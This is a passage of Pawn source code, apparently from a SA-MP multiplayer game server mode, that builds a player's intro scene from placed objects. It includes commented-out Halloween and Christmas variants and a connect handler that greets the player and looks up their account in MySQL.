		soplayer[playerid][1] = CreatePlayerObject(playerid, 3033, -1085.036621, -892.134521, 135.454116, 0.000000, -55.000000, 0.000000);
		soplayer[playerid][2] = CreatePlayerObject(playerid, 16132, -1050.991333, -884.808410, 133.056640, 0.000000, 0.000000, 90.000000);
		soplayer[playerid][3] = CreatePlayerObject(playerid, 3033, -1082.086547, -892.132507, 139.664108, 0.000000, -55.000000, 0.000000);
		soplayer[playerid][4] = CreatePlayerObject(playerid, 3033, -1082.036621, -892.131530, 134.254119, 0.000000, -125.000000, 0.000000);
		soplayer[playerid][5] = CreatePlayerObject(playerid, 3033, -1085.006713, -892.128540, 138.504119, 0.000000, -125.000000, 0.000000);
		soplayer[playerid][6] = CreatePlayerObject(playerid, 3033, -1077.036621, -892.134521, 135.154098, 0.000000, -90.000000, 0.000000);
		soplayer[playerid][7] = CreatePlayerObject(playerid, 3033, -1077.036621, -892.134521, 140.754104, 0.000000, -90.000000, 0.000000);
		soplayer[playerid][8] = CreatePlayerObject(playerid, 3033, -1077.036621, -892.131530, 143.754104, 0.000000, -90.000000, 0.000000);
		soplayer[playerid][9] = CreatePlayerObject(playerid, 3033, -1074.376586, -892.129516, 142.954101, 0.000000, -135.000000, 0.000000);
		soplayer[playerid][10] = CreatePlayerObject(playerid, 3033, -1072.546997, -892.134521, 141.134094, 0.000000, -135.000000, 0.000000);
		soplayer[playerid][11] = CreatePlayerObject(playerid, 3033, -1070.326416, -892.130493, 142.604095, 0.000000, -45.000000, 0.000000);
		soplayer[playerid][12] = CreatePlayerObject(playerid, 3033, -1068.476562, -892.127502, 144.454101, 0.000000, -45.000000, 0.000000);
		soplayer[playerid][13] = CreatePlayerObject(playerid, 3033, -1066.446655, -892.130432, 143.754104, 0.000000, -90.000000, 0.000000);
		soplayer[playerid][14] = CreatePlayerObject(playerid, 3033, -1066.436645, -892.134521, 140.754104, 0.000000, -90.000000, 0.000000);
		soplayer[playerid][15] = CreatePlayerObject(playerid, 3033, -1066.436645, -892.134521, 135.154098, 0.000000, -90.000000, 0.000000);
		soplayer[playerid][16] = CreatePlayerObject(playerid, 3033, -1057.036621, -892.130493, 132.854095, 0.000000, 180.000000, 0.000000);
		soplayer[playerid][17] = CreatePlayerObject(playerid, 3033, -1061.056640, -892.134582, 135.184097, 0.000000, -120.000000, 0.000000);
		soplayer[playerid][18] = CreatePlayerObject(playerid, 3033, -1061.046630, -892.130493, 139.834106, 0.000000, -60.000000, 0.000000);
		soplayer[playerid][19] = CreatePlayerObject(playerid, 3033, -1057.036621, -892.126464, 142.154113, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][20] = CreatePlayerObject(playerid, 3033, -1053.016357, -892.130493, 139.834091, 0.000000, 60.000000, 0.000000);
		soplayer[playerid][21] = CreatePlayerObject(playerid, 3033, -1052.986694, -892.134521, 135.154113, 0.000000, 120.000000, 0.000000);
		soplayer[playerid][22] = CreatePlayerObject(playerid, 3033, -1048.036621, -892.134521, 134.654129, 0.000000, 225.000000, 0.000000);
		soplayer[playerid][23] = CreatePlayerObject(playerid, 3033, -1044.316650, -892.131530, 134.654113, 0.000000, 135.000000, 0.000000);
		soplayer[playerid][24] = CreatePlayerObject(playerid, 3033, -1049.956542, -892.130493, 139.314102, 0.000000, 270.000000, 0.000000);
		soplayer[playerid][25] = CreatePlayerObject(playerid, 3033, -1042.386596, -892.130493, 139.304107, 0.000000, 90.000000, 0.000000);
		soplayer[playerid][26] = CreatePlayerObject(playerid, 3033, -1040.636718, -892.130493, 139.304107, 0.000000, 270.000000, 0.000000);
		soplayer[playerid][27] = CreatePlayerObject(playerid, 3033, -1040.636596, -892.134521, 135.254104, 0.000000, 270.000000, 0.000000);
		soplayer[playerid][28] = CreatePlayerObject(playerid, 3033, -1036.836669, -892.130493, 139.304122, 0.000000, -90.000000, 0.000000);
		soplayer[playerid][29] = CreatePlayerObject(playerid, 3033, -1036.836669, -892.134521, 135.254104, 0.000000, -90.000000, 0.000000);
		soplayer[playerid][30] = CreatePlayerObject(playerid, 3033, -1033.036621, -892.126525, 141.884109, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][31] = CreatePlayerObject(playerid, 3033, -1034.236694, -892.122497, 138.354110, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][32] = CreatePlayerObject(playerid, 3033, -1033.036621, -892.130493, 132.754104, 0.000000, 180.000000, 0.000000);
		soplayer[playerid][33] = CreatePlayerObject(playerid, 983, -1081.006103, -892.128417, 135.518875, 55.000000, 0.000000, 90.000000);
		soplayer[playerid][34] = CreatePlayerObject(playerid, 983, -1081.890014, -892.123779, 134.898315, 55.000000, 0.000000, 90.000000);
		soplayer[playerid][35] = CreatePlayerObject(playerid, 983, -1083.499877, -892.138488, 134.941864, -55.000000, 0.000000, 90.000000);
		soplayer[playerid][36] = CreatePlayerObject(playerid, 983, -1084.355957, -892.133605, 135.538330, -55.000000, 0.000000, 90.000000);
		soplayer[playerid][37] = CreatePlayerObject(playerid, 984, -1076.571655, -892.141540, 140.124069, 90.000000, 0.000000, 90.000000);
		soplayer[playerid][38] = CreatePlayerObject(playerid, 984, -1075.455322, -892.127807, 140.107254, 90.000000, 90.000000, 180.000000);
		soplayer[playerid][39] = CreatePlayerObject(playerid, 984, -1065.973999, -892.136657, 140.082397, 90.000000, 0.000000, 90.000000);
		soplayer[playerid][40] = CreatePlayerObject(playerid, 984, -1064.939819, -892.138427, 140.116638, 90.000000, 0.000000, 90.000000);
		soplayer[playerid][41] = CreatePlayerObject(playerid, 984, -1058.839843, -892.133544, 132.247863, 60.000000, 0.000000, 90.000000);
		soplayer[playerid][42] = CreatePlayerObject(playerid, 984, -1058.182250, -892.138366, 133.209899, 60.000000, 0.000000, 90.000000);
		soplayer[playerid][43] = CreatePlayerObject(playerid, 983, -1057.122070, -892.130859, 134.401062, 0.000000, 0.000000, 90.000000);
		soplayer[playerid][44] = CreatePlayerObject(playerid, 984, -1055.294067, -892.133239, 132.273345, 120.000000, 0.000000, 90.000000);
		soplayer[playerid][45] = CreatePlayerObject(playerid, 984, -1055.863891, -892.136230, 133.363662, 120.000000, 0.000000, 90.000000);
		soplayer[playerid][46] = CreatePlayerObject(playerid, 984, -1040.182983, -892.140319, 135.604904, 90.000000, 0.000000, 90.000000);
		soplayer[playerid][47] = CreatePlayerObject(playerid, 984, -1039.126586, -892.131652, 135.620361, 90.000000, 0.000000, 90.000000);
		soplayer[playerid][48] = CreatePlayerObject(playerid, 984, -1036.386840, -892.141540, 135.649856, 90.000000, 0.000000, 90.000000);
		soplayer[playerid][49] = CreatePlayerObject(playerid, 984, -1035.352172, -892.144531, 135.650512, 90.000000, 0.000000, 90.000000);
		soplayer[playerid][50] = CreatePlayerObject(playerid, 983, -1033.914062, -892.144042, 131.760070, 90.000000, 0.000000, 90.000000);
		soplayer[playerid][51] = CreatePlayerObject(playerid, 983, -1032.441894, -892.137817, 131.770782, 90.000000, 0.000000, 90.000000);
		soplayer[playerid][52] = CreatePlayerObject(playerid, 983, -1030.941650, -892.124267, 131.770751, 90.000000, 0.000000, 270.000000);
		soplayer[playerid][53] = CreatePlayerObject(playerid, 2765, -1048.113769, -891.688415, 134.439971, 0.000000, 45.000000, 0.000000);
		soplayer[playerid][54] = CreatePlayerObject(playerid, 2765, -1048.358520, -891.693969, 136.394363, 0.000000, 45.000000, 0.000000);
		soplayer[playerid][55] = CreatePlayerObject(playerid, 2765, -1049.794799, -891.672973, 136.130035, 0.000000, 45.000000, 0.000000);
		soplayer[playerid][56] = CreatePlayerObject(playerid, 2765, -1045.674804, -891.681762, 133.045471, 0.000000, -45.000000, 0.000000);
		soplayer[playerid][57] = CreatePlayerObject(playerid, 2765, -1045.471923, -891.690734, 135.003433, 0.000000, -45.000000, 0.000000);
		soplayer[playerid][58] = CreatePlayerObject(playerid, 2765, -1043.908325, -891.682617, 134.823287, 0.000000, -45.000000, 0.000000);
		soplayer[playerid][59] = CreatePlayerObject(playerid, 983, -1048.375000, -892.132324, 138.884521, 90.000000, 0.000000, 90.000000);
		soplayer[playerid][60] = CreatePlayerObject(playerid, 983, -1043.947631, -892.133605, 138.818252, 90.000000, 0.000000, 90.000000);
		soplayer[playerid][61] = CreatePlayerObject(playerid, 983, -1081.925781, -892.132446, 139.020217, 125.000000, 0.000000, 90.000000);
		soplayer[playerid][62] = CreatePlayerObject(playerid, 983, -1081.087890, -892.129821, 138.386215, 125.000000, 0.000000, 90.000000);
		soplayer[playerid][63] = CreatePlayerObject(playerid, 983, -1084.318237, -892.121459, 138.425704, 55.000000, 0.000000, 90.000000);
		soplayer[playerid][64] = CreatePlayerObject(playerid, 983, -1083.459472, -892.136291, 139.018463, 55.000000, 0.000000, 90.000000);
		soplayer[playerid][65] = CreatePlayerObject(playerid, 983, -1068.409545, -892.122497, 143.784957, 135.000000, 0.000000, 90.000000);
		soplayer[playerid][66] = CreatePlayerObject(playerid, 2765, -1050.169799, -891.669677, 141.631515, 0.000000, 90.000000, 0.000000);
		soplayer[playerid][67] = CreatePlayerObject(playerid, 983, -1068.903686, -892.133850, 141.862106, 135.000000, 0.000000, 90.000000);
		soplayer[playerid][68] = CreatePlayerObject(playerid, 983, -1072.538818, -892.129150, 141.802062, 45.000000, 0.000000, 90.000000);
		soplayer[playerid][69] = CreatePlayerObject(playerid, 983, -1073.038452, -892.131896, 143.792068, 45.000000, 0.000000, 90.000000);
		soplayer[playerid][70] = CreatePlayerObject(playerid, 2765, -1043.293457, -891.674194, 141.612319, 0.000000, 90.000000, 0.000000);
		soplayer[playerid][71] = CreatePlayerObject(playerid, 2765, -1043.293457, -891.674194, 138.962341, 0.000000, 90.000000, 0.000000);
		soplayer[playerid][72] = CreatePlayerObject(playerid, 2765, -1050.169799, -891.670654, 138.981506, 0.000000, 90.000000, 0.000000);
		soplayer[playerid][73] = CreatePlayerObject(playerid, 2765, -1033.937377, -891.659301, 136.094528, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][74] = CreatePlayerObject(playerid, 2765, -1033.890502, -891.664306, 137.449539, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][75] = CreatePlayerObject(playerid, 2765, -1032.824462, -891.666442, 140.948822, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][76] = CreatePlayerObject(playerid, 2765, -1032.690917, -891.663635, 139.628494, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][77] = CreatePlayerObject(playerid, 2765, -1035.298461, -891.671081, 140.976058, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][78] = CreatePlayerObject(playerid, 2765, -1035.375488, -891.671020, 139.634750, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][79] = CreatePlayerObject(playerid, 983, -1057.108764, -892.137695, 140.583557, 0.000000, 0.000000, 90.000000);
		soplayer[playerid][80] = CreatePlayerObject(playerid, 983, -1054.218994, -892.123840, 138.804229, 60.000000, 0.000000, 90.000000);
		soplayer[playerid][81] = CreatePlayerObject(playerid, 983, -1059.671630, -892.128173, 139.071548, 120.000000, 0.000000, 90.000000);
		soplayer[playerid][82] = CreatePlayerObject(playerid, 8880, -1032.297729, -896.778381, 134.329193, 80.000000, 0.000000, 45.000000);
		soplayer[playerid][83] = CreatePlayerObject(playerid, 8880, -1084.297729, -896.778381, 134.329193, 80.000000, 0.000000, -45.000000);
		soplayer[playerid][84] = CreatePlayerObject(playerid, 8880, -1072.297729, -896.778381, 134.329193, 80.000000, 0.000000, 0.000000);
		soplayer[playerid][85] = CreatePlayerObject(playerid, 8880, -1058.297729, -896.778381, 134.329193, 80.000000, 0.000000, 0.000000);
		soplayer[playerid][86] = CreatePlayerObject(playerid, 8880, -1044.297729, -896.778381, 134.329193, 80.000000, 0.000000, 0.000000);
		soplayer[playerid][87] = CreatePlayerObject(playerid, 19279, -1028.582763, -901.387329, 130.358734, 0.000000, 0.000000, 45.000000);
		soplayer[playerid][88] = CreatePlayerObject(playerid, 19279, -1044.939453, -902.624023, 130.168121, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][89] = CreatePlayerObject(playerid, 19279, -1043.697509, -902.597045, 130.156646, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][90] = CreatePlayerObject(playerid, 19279, -1027.683593, -900.583190, 130.608718, 0.000000, 0.000000, 45.000000);
		soplayer[playerid][91] = CreatePlayerObject(playerid, 19279, -1057.639404, -902.593994, 130.158126, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][92] = CreatePlayerObject(playerid, 19279, -1058.947387, -902.547058, 130.166641, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][93] = CreatePlayerObject(playerid, 19279, -1088.839477, -900.524047, 130.148117, 0.000000, 0.000000, -45.000000);
		soplayer[playerid][94] = CreatePlayerObject(playerid, 19279, -1087.897583, -901.197082, 129.956634, 0.000000, 0.000000, -45.000000);
		soplayer[playerid][95] = CreatePlayerObject(playerid, 19279, -1071.509521, -902.374084, 129.768096, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][96] = CreatePlayerObject(playerid, 19279, -1073.047485, -902.397033, 129.756652, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][97] = CreatePlayerObject(playerid, 5002, -1063.022705, -898.634948, 143.552378, 0.000000, 0.000000, 0.000000);

		SetPlayerTime(playerid, 23, 00);
		SetPlayerWeather(playerid, 14);
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,  -1056.7439, -939.2350, 143.552378);
		SetPlayerFacingAngle(playerid, 186.00);
		SetPlayerCameraPos(playerid, -1056.6455, -948.9283, 142.6649);
		SetPlayerCameraLookAt(playerid, -1056.8439, -939.2350, 144.1724);

	    // HALLOWEEN
		/*soplayer[playerid][0] = CreatePlayerObject(playerid, 1369, 962.404602, 2140.671386, 1010.619873, 0.000000, 0.000000, 240.000000);
		soplayer[playerid][1] = CreatePlayerObject(playerid, 2590, 955.991699, 2143.427001, 1016.223510, 0.000000, 0.000000, 45.000000);
		soplayer[playerid][2] = CreatePlayerObject(playerid, 2590, 955.960815, 2141.614990, 1016.219543, 0.000000, 0.000000, 45.000000);
		soplayer[playerid][3] = CreatePlayerObject(playerid, 935, 964.814025, 2146.574462, 1010.620971, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][4] = CreatePlayerObject(playerid, 935, 965.113952, 2145.774658, 1010.620971, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][5] = CreatePlayerObject(playerid, 935, 964.013977, 2146.374511, 1010.620971, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][6] = CreatePlayerObject(playerid, 941, 960.414123, 2146.475341, 1010.520996, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][7] = CreatePlayerObject(playerid, 2908, 959.914123, 2146.374267, 1011.121093, 270.000000, 0.000000, 120.000000);
		soplayer[playerid][8] = CreatePlayerObject(playerid, 2908, 960.214172, 2146.474365, 1011.071044, 0.000000, 0.000000, 90.000000);
		soplayer[playerid][9] = CreatePlayerObject(playerid, 934, 964.914001, 2134.274658, 1011.321044, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][10] = CreatePlayerObject(playerid, 18698, 960.804504, 2146.323974, 1010.530639, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][11] = CreatePlayerObject(playerid, 1800, 952.827941, 2146.467285, 1010.023315, 0.000000, 0.000000, 90.000000);
		soplayer[playerid][12] = CreatePlayerObject(playerid, 18698, 960.342285, 2146.640625, 1010.529113, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][13] = CreatePlayerObject(playerid, 18698, 960.351745, 2147.174804, 1010.519592, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][14] = CreatePlayerObject(playerid, 18698, 959.312988, 2147.217041, 1010.520812, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][15] = CreatePlayerObject(playerid, 18698, 960.081848, 2147.339843, 1012.520080, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][16] = CreatePlayerObject(playerid, 18698, 959.338134, 2147.347167, 1010.020568, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][17] = CreatePlayerObject(playerid, 18698, 960.607238, 2147.117919, 1010.028137, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][18] = CreatePlayerObject(playerid, 18698, 959.838439, 2147.169189, 1010.270263, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][19] = CreatePlayerObject(playerid, 2803, 964.940551, 2143.363525, 1010.551086, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][20] = CreatePlayerObject(playerid, 335, 959.912048, 2146.351074, 1011.450378, 180.000000, -15.000000, 210.000000);
		soplayer[playerid][21] = CreatePlayerObject(playerid, 19038, 960.739868, 2146.214843, 1011.050537, 75.000000, 270.000000, 45.000000);
		soplayer[playerid][22] = CreatePlayerObject(playerid, 1789, 961.037292, 2140.259765, 1010.580749, 0.000000, 0.000000, 180.000000);
		soplayer[playerid][23] = CreatePlayerObject(playerid, 1210, 960.416992, 2140.252197, 1011.060363, 90.000000, 0.000000, 640.000000);
		soplayer[playerid][24] = CreatePlayerObject(playerid, 335, 960.717651, 2140.274414, 1010.970458, 90.000000, 0.000000, 30.000000);
		soplayer[playerid][25] = CreatePlayerObject(playerid, 971, 948.593383, 2147.502197, 1012.523986, 0.000000, 90.000000, 180.000000);
		soplayer[playerid][26] = CreatePlayerObject(playerid, 971, 948.618286, 2140.776367, 1012.524291, 0.000000, 270.000000, 0.000000);
		soplayer[playerid][27] = CreatePlayerObject(playerid, 335, 960.868835, 2140.359619, 1010.967529, 90.000000, 0.000000, 5.000000);

		soplayer[playerid][28] = CreatePlayerObject(playerid, 341, 961.541687, 2146.810058, 1011.140380, 80.000000, 90.000000, -200.000000);
		soplayer[playerid][29] = CreatePlayerObject(playerid, 1886, 958.646118, 2143.396728, 1010.538635, 0.000000, 540.000000, 415.000000);
		soplayer[playerid][30] = CreatePlayerObject(playerid, 2908, 955.859436, 2141.604248, 1013.993408, 310.000000, 390.000000, 120.000000);
		soplayer[playerid][31] = CreatePlayerObject(playerid, 2907, 955.762084, 2141.629882, 1013.473510, 260.000000, 430.000000, 270.000000);
		soplayer[playerid][32] = CreatePlayerObject(playerid, 2906, 955.945007, 2141.681396, 1013.453430, -100.000000, 100.000000, 90.000000);
		soplayer[playerid][33] = CreatePlayerObject(playerid, 2906, 955.566406, 2141.633056, 1013.563476, -116.000000, 90.000000, 270.000000);
		soplayer[playerid][34] = CreatePlayerObject(playerid, 2905, 955.758483, 2141.609130, 1012.723388, -90.000000, 90.000000, 180.000000);
		soplayer[playerid][35] = CreatePlayerObject(playerid, 2905, 955.516113, 2141.991455, 1010.083496, 0.000000, 0.000000, 60.000000);
		soplayer[playerid][36] = CreatePlayerObject(playerid, 1789, 958.288208, 2142.902099, 1010.577148, 0.000000, 0.000000, 63.000000);
		soplayer[playerid][37] = CreatePlayerObject(playerid, 1783, 958.299438, 2142.921630, 1010.791381, 0.000000, 0.000000, 60.000000);
		soplayer[playerid][38] = CreatePlayerObject(playerid, 1787, 958.324035, 2142.897216, 1010.519592, 0.000000, 0.000000, 60.000000);
		soplayer[playerid][39] = CreatePlayerObject(playerid, 1790, 958.272644, 2142.938720, 1011.064819, 0.000000, 0.000000, -120.000000);
		soplayer[playerid][40] = CreatePlayerObject(playerid, 1791, 958.107971, 2143.090576, 1011.139587, 0.000000, 0.000000, 60.000000);

		SetPlayerInterior(playerid, 1);
		SetPlayerPos(playerid, 962.2606, 2140.7847, 1011.8781);
		SetPlayerFacingAngle(playerid, 54.5837);
		SetPlayerCameraPos(playerid, 965.3184, 2133.0920, 1014.3455);
		SetPlayerCameraLookAt(playerid, 956.8830, 2146.6340, 1011.0234);*/

		// CHRISTMAS
		/*soplayer[playerid][0] = CreatePlayerObject(playerid, 14430, -1017.832275, -934.073364, 1003.389099, 0.000000, 0.000000, 90.000000);
		soplayer[playerid][1] = CreatePlayerObject(playerid, 14421, -1025.655761, -913.633300, 1009.323730, 0.000000, 0.000000, 450.000000);
		soplayer[playerid][2] = CreatePlayerObject(playerid, 14421, -1008.852294, -903.742431, 1009.272338, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][3] = CreatePlayerObject(playerid, 14421, -1011.562500, -899.587524, 1009.328125, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][4] = CreatePlayerObject(playerid, 3461, -1007.020751, -914.236694, 1004.574707, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][5] = CreatePlayerObject(playerid, 19076, -1008.672363, -911.068237, 997.983642, 0.000000, 0.000000, 140.000000);
		soplayer[playerid][6] = CreatePlayerObject(playerid, 19055, -1009.391357, -910.918823, 1006.690429, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][7] = CreatePlayerObject(playerid, 19057, -1009.533447, -912.357788, 1006.078247, 0.000000, 0.000000, 60.000000);
		soplayer[playerid][8] = CreatePlayerObject(playerid, 19064, -1007.567382, -913.481689, 1007.573059, 0.000000, 270.000000, 90.000000);
		soplayer[playerid][9] = CreatePlayerObject(playerid, 19064, -1007.555664, -913.837890, 1007.566406, 0.000000, 270.000000, 90.000000);
		soplayer[playerid][10] = CreatePlayerObject(playerid, 19064, -1007.566406, -914.209228, 1007.568359, 0.000000, 270.000000, 90.000000);
		soplayer[playerid][11] = CreatePlayerObject(playerid, 19064, -1007.544677, -914.680664, 1007.566101, 0.000000, 270.000000, 90.000000);
		soplayer[playerid][12] = CreatePlayerObject(playerid, 1504, -1012.039306, -918.084594, 1006.079650, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][13] = CreatePlayerObject(playerid, 1504, -1013.543212, -918.078613, 1006.071960, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][14] = CreatePlayerObject(playerid, 2842, -1008.259521, -914.605468, 1006.057861, 0.000000, 0.000000, 90.000000);
		soplayer[playerid][15] = CreatePlayerObject(playerid, 2842, -1009.175537, -914.607177, 1006.061279, 0.000000, 0.000000, 90.000000);
		soplayer[playerid][16] = CreatePlayerObject(playerid, 1703, -1011.267333, -914.971435, 1006.074340, 0.000000, 0.000000, 90.000000);
		soplayer[playerid][17] = CreatePlayerObject(playerid, 1703, -1007.848388, -916.453125, 1006.076904, 0.000000, 0.000000, 197.000000);
		soplayer[playerid][18] = CreatePlayerObject(playerid, 1736, -1007.557617, -914.141357, 1009.067321, 0.000000, 0.000000, -90.000000);
		soplayer[playerid][19] = CreatePlayerObject(playerid, 1827, -1009.170410, -914.124267, 1006.062988, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][20] = CreatePlayerObject(playerid, 1670, -1009.126708, -914.220214, 1006.562072, 0.000000, 0.000000, 180.000000);
		soplayer[playerid][21] = CreatePlayerObject(playerid, 2828, -1007.485107, -913.144042, 1008.262573, 0.000000, 1.000000, 90.000000);
		soplayer[playerid][22] = CreatePlayerObject(playerid, 2251, -1007.774414, -917.737792, 1006.928283, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][23] = CreatePlayerObject(playerid, 19060, -1009.197021, -914.052612, 1010.077941, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][24] = CreatePlayerObject(playerid, 2481, -1008.324218, -912.771972, 1006.159240, -90.000000, 0.000000, 30.000000);
		soplayer[playerid][25] = CreatePlayerObject(playerid, 2268, -1007.735351, -916.535644, 1007.557739, 0.000000, 0.000000, 270.000000);
		soplayer[playerid][26] = CreatePlayerObject(playerid, 1724, -1010.915771, -916.801269, 1006.076171, 0.000000, 0.000000, 120.000000);
		soplayer[playerid][27] = CreatePlayerObject(playerid, 2096, -1012.171386, -910.766723, 1006.079162, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][28] = CreatePlayerObject(playerid, 3534, -1010.727294, -915.789306, 1510.487915, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][29] = CreatePlayerObject(playerid, 2710, -1007.392822, -914.826538, 1008.407348, 60.000000, 0.000000, 270.000000);
		soplayer[playerid][30] = CreatePlayerObject(playerid, 3250, -1018.538818, -933.256835, 128.321289, 0.000000, 0.000000, 150.000000);
		soplayer[playerid][31] = CreatePlayerObject(playerid, 16501, -1006.432373, -913.854125, 1008.562133, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][32] = CreatePlayerObject(playerid, 3115, -1014.502685, -909.851562, 1009.579345, 90.000000, 0.000000, 0.000000);
		soplayer[playerid][33] = CreatePlayerObject(playerid, 3115, -1019.123046, -912.926147, 1008.581970, 0.000000, 90.000000, 0.000000);
		soplayer[playerid][34] = CreatePlayerObject(playerid, 3115, -1012.116210, -918.325683, 1008.579528, 90.000000, 0.000000, 180.000000);
		soplayer[playerid][35] = CreatePlayerObject(playerid, 6959, -1011.401794, -914.519287, 1006.094177, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][36] = CreatePlayerObject(playerid, 3095, -1007.228027, -908.109924, 1008.126586, 90.000000, 0.000000, 90.000000);
		soplayer[playerid][37] = CreatePlayerObject(playerid, 3095, -1006.679687, -920.093139, 1007.861083, 90.000000, 0.000000, 270.000000);
		soplayer[playerid][38] = CreatePlayerObject(playerid, 5002, -1009.679077, -1918.927246, 1004.940795, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][39] = CreatePlayerObject(playerid, 2229, -1007.728271, -914.123779, 1008.240783, 90.000000, 0.000000, -180.000000);
		soplayer[playerid][40] = CreatePlayerObject(playerid, 2229, -1007.109802, -914.081726, 1008.240844, 90.000000, 0.000000, 0.000000);
		soplayer[playerid][41] = CreatePlayerObject(playerid, 3095, -1007.230224, -914.894165, 1013.070800, 360.000000, 270.000000, 180.000000);
		soplayer[playerid][42] = CreatePlayerObject(playerid, 6959, -1011.461486, -916.057739, 1010.590698, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][43] = CreatePlayerObject(playerid, 16502, -1015.155151, -926.669921, 125.425102, 0.000000, 4.400000, 240.000000);
		soplayer[playerid][44] = CreatePlayerObject(playerid, 1215, -1014.088073, -927.041625, 128.713684, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][45] = CreatePlayerObject(playerid, 1215, -1016.001342, -925.935546, 128.729339, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][46] = CreatePlayerObject(playerid, 1478, -1014.872497, -928.440429, 128.750717, 0.000000, 0.000000, 150.000000);
		soplayer[playerid][47] = CreatePlayerObject(playerid, 2074, -1017.802612, -928.870971, 130.918792, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][48] = CreatePlayerObject(playerid, 2074, -1017.802612, -928.870971, 130.918792, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][49] = CreatePlayerObject(playerid, 5002, -1017.333251, -1924.898803, 125.675621, 0.000000, 0.000000, 0.000000);
		soplayer[playerid][50] = CreatePlayerObject(playerid, 2911, -1018.840026, -914.825866, 1006.080749, 0.000000, 0.000000, 450.000000);

		SetPlayerTime(playerid, 00, 00);
		SetPlayerWeather(playerid, 10);
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid, -1009.4122, -916.9106, 1007.5698);
		SetPlayerFacingAngle(playerid, 25.4942);
		SetPlayerCameraPos(playerid, -1017.1292, -916.0859, 1009.9629);
		SetPlayerCameraLookAt(playerid, -1008.3177, -914.0156, 1007.5629);*/

		if (!player[playerid][INTROtextdraw])
		{
			//TextDrawShowForPlayer(playerid, introhalloween);
			TextDrawShowForPlayer(playerid, intro1);
	        player[playerid][FadeTimer] = SetTimerEx("FadeIntro", 1000, 0, "d", playerid);
			player[playerid][FadeStepOn] = 1;
			player[playerid][INTROtextdraw] = 1;
		}

		/*if (!player[playerid][RULEStextdraw])
		{
			TextDrawShowForPlayer(playerid, nrules);
			player[playerid][RULEStextdraw] = 1;
		}*/
	}
	ApplyAnimation(playerid, "FOOD", "FF_Sit_Loop",4.1,0,1,1,1,1,1); // default
	//ApplyAnimation(playerid, "SUNBATHE", "ParkSit_M_IdleA", 4.1, 0, 1, 1, 1, 1, 1); // christmas
	//ApplyAnimation(playerid, "FOOD", "FF_Die_Left",4.1,0,1,1,1,1,1); // halloween

	//PlayerPlaySound(playerid, 1097, 0.0, 0.0, 0.0);
    return 1;
}

public OnPlayerRequestSpawn(playerid)
{
	//printf("\r\n[DEBUG-STUNTA] OnPlayerRequestSpawn(%d)", playerid);

	/*if (IsPlayerNPC(playerid))
	return 1;*/
	
	return 1;
}

public OnPlayerConnect(playerid)
{
	//printf("\r\n[DEBUG-STUNTA] OnPlayerConnect(%d)", playerid);

	ResetPlayerArrays(playerid);

    if (!IsPlayerNPC(playerid))
	{
	    new message[128];
	    /*TextDrawShowForPlayer(playerid, title);
		//TextDrawShowForPlayer(playerid, info);
		TextDrawShowForPlayer(playerid, rules);
		TextDrawShowForPlayer(playerid, rules2);
		TextDrawShowForPlayer(playerid, credits);
		SetTimerEx("HideInfoShowStats",15000,0, "i",playerid);*/

		if (player[playerid][cinc] < MAX_PLAYERS) player[playerid][cinc]++;
		else player[playerid][cinc] = 0;

		Visitors++;

		GetPlayerName(playerid, playername, sizeof(playername));
		format(message, sizeof(message), "%s has joined the server.", playername);
		SendServerMessageToAll(EMBED_GREY, message);
		printflog("JOIN", message);

		SendServerMessage(playerid, EMBED_WHITE, "Welcome to the "EMBED_PINKRED"xMovie Server"EMBED_WHITE"! Type /help to view server commands and don't forget to read the /rules!");
		SendDeathMessage(INVALID_PLAYER_ID, playerid, 200);

		new mysqlStr[92];
		mysql_real_escape_string(playername, playername);
	    format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_ACCOUNTS" WHERE `account_name` = '%s' LIMIT 1", playername);
		mysql_run_query(mysqlConnection, mysqlStr, true, "QS_AssignPlayerAccount", "ii", playerid, player[playerid][cinc]);

		SetVehicleParamsForPlayerEx(lockedveh[0], playerid, 0, 1);
		SetVehicleParamsForPlayerEx(lockedveh[1], playerid, 0, 1);
